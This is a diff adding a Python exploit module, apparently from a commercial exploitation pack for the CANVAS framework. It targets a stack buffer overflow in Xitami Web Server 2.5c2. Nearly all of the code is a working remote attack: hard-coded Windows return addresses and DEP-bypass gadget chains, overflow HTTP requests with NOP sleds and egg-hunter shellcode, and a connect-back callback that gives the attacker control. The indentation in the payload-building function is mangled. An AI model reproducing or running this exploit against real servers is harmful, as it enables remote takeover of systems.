@@ -1,0 +1,176 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+
+import sys
+import random
+
+if "." not in sys.path: 
+		sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "[0 Day] Xitami Web Server 2.5c2 Stack Overflow"
+
+DESCRIPTION = "Stack overflow vulnerability in Xitami Web Server 2.5c2"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "Not Public"
+DOCUMENTATION["VersionsAffected"] = "Xitami Web Server 2.5c2"
+DOCUMENTATION["CVE Name"] = "CVE-2007-5067"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5067"
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "XP", "2003" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : [ "Windows 2000 SP4 English", 0x7c4fedbb ], # call esp @ kernel32.dll
+    1 : [ "Windows 2003 SP0 English", 0x77e843eb ], # call esp @ kernel32.dll
+    2 : [ "Windows XP   SP1 English", 0x77e9ae59 ], # call esp @ kernel32.dll
+    3 : [ "Windows 2003 SP1 English (DEP)", 0x7c985842, 0x77e6b981, 0x77bde250, 0x7c83e413, 0x77e6334b ], # anti-dep
+    4 : [ "Windows 2003 SP2 English (DEP)", 0x7cac9b5a, 0x77e61c49, 0x77bde250, 0x7c83f517, 0x77eb4303 ], # anti-dep
+    5 : [ "Windows XP   SP2 English (DEP)", 0x7cbb3fdc, 0x7c80e198, 0x77c4d230, 0x7c91d3f8, 0x7c82385d ], # anti-dep 
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       
+        self.port = 80
+        self.version = 1
+        self.searchbadstring = "\x00\x0a\x0d"
+        self.badstring = self.searchbadstring
+        return
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]
+    
+    def createShellcode(self):
+        if self.callback:
+            host = self.callback.ip
+            port = self.callback.port       
+            
+        self.createWin32SearchShellcode(host, port)
+        
+        return self.shellcode       
+
+    def run(self):
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+        
+        # Connection for the searchshellcode
+        s = self.gettcpsock()
+        s.connect((self.host, self.port))
+        
+        # Connection for the final shellcode
+        s2=self.gettcpsock()
+        s2.connect((self.host, self.port))        
+        data_1 = "GET / HTTP/1.0\r\nAccept-Language: fr" + self.shellcode + "\r\n" + "User-Agent: " + self.shellcode + "Mozilla/4.0 (compatible; MSIE 6.0; )\r\nHost: "+ self.host + "\r\n\r\n"                                
+        s2.sendall(data_1)
+        s2.recv(1000)
+                
+        s.sendall(sploitstring)        
+
+        if self.ISucceeded():
+            self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+            self.log("%s done (succeeded!)" % self.name)
+            return 1
+        
+        return 0    
+        
+    def makesploit(self):
+        """
+        Construct the attack        			  
+				
+				"""        								
+        if (self.version >= 3): # Windows XP SP2 / Windows 2003 SP1/SP2          					
+					os_name, anti_dep_1, anti_dep_2, anti_dep_3, anti_dep_4, call_esp = targets[self.version]
+        
+					ret = str(struct.pack('<L', call_esp))
+					ad1 = str(struct.pack('<L', anti_dep_1))
+					ad2 = str(struct.pack('<L', anti_dep_2))
+					ad3 = str(struct.pack('<L', anti_dep_3))
+					ad4 = str(struct.pack('<L', anti_dep_4))
+										
+					data_1 = "GET / HTTP/1.0\r\nAccept-Language: fr\r\nIf-Modified-Since: Sat, 29 Oct"
+					data_2 = "\x90" * 69
+					data_3 = "\x90" * 200
+          		        
+					tmp = data_3[0:8]
+					tmp += self.encodedsearchcode
+					tmp += data_3[8 + len(self.encodedsearchcode):]
+  					
+  				# Windows XP SP2 US
+        	# 0x7cbb3fdc : push esp /pop ebp / ret @ shell32.dll
+        	# 0x7c80e198 : mov eax,1 @ kernel32.dll
+        	# 0x77c4d230 : add esp,14 @ msvcrt.dll
+        	# 0x7c91d3f8 : anti-dep
+        	# 0x7c82385d : call esp        	
+        						
+					sploitstring = data_1 + data_2 + ad1 + ad2 + ad3 + "\xff\xff\xff\xff" + "\xff\xff\xff\xff" + "\xff\xff\xff\xff" + "\xff\xff\xff\xff" + "\xff\xff\xff\xff" + ad4 + ret + tmp + " 1994 19:43:31 GMT\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; )\r\nHost: "+ self.host + "\r\n\r\n"					
+          
+        else:                   # Windows 2000 / Windows XP SP1 / Windows 2003 SP0        	
+					os_name, call_esp = targets[self.version]
+        
+					ret = struct.pack('<L', call_esp)
+					jmp = "\xeb\x1a\x90\x90"
+        
+					data_1 = "GET / HTTP/1.0\r\nAccept-Language: fr\r\nIf-Modified-Since: Sat, 29 Oct"
+					data_2 = "\x90" * 69
+					data_3 = "\x90" * 200
+          		        
+					tmp = data_3[0:24]
+					tmp += self.encodedsearchcode
+					tmp += data_3[24 + len(self.encodedsearchcode):]
+  
+					sploitstring = data_1 + data_2 + str(ret) + jmp + tmp + " 1994 19:43:31 GMT\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; )\r\nHost: "+ self.host + "\r\n\r\n"
+  		
+        return sploitstring
+        		
+    def usage(self):        
+        print "Usage: %s -v version -t host -l localip -d localport\n" % sys.argv[0]
+        
+        i = 0
+        
+        print 'Available versions:'
+        
+        for listline in targets.values():
+            print '\t%d: %s'%(i, listline[0])
+            i = i + 1
+        
+        sys.exit(0) 
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
